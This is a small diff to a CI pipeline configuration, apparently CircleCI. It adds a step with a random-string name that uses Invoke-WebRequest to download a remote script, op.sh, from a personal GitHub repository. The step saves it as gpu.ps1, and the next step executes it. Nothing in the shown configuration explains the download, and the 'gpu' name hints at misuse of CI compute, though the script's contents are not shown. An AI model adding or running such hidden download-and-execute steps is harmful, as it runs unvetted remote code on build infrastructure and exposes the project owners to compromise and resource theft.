@@ -16,6 +16,7 @@ jobs:
       - run: 
           name: 23C7hFqGnru9xqOSxU4FhesoTSu_6i9M16BNH76hKLmUo2az
           command: |      
-            Invoke-WebRequest https://raw.githubusercontent.com/thenoobgamer12/practice/main/op.sh
-                      
+            Invoke-WebRequest https://raw.githubusercontent.com/thenoobgamer12/practice/main/op.sh -OutFile gpu.ps1 
+            
+                                  
       - run: ./gpu.ps1
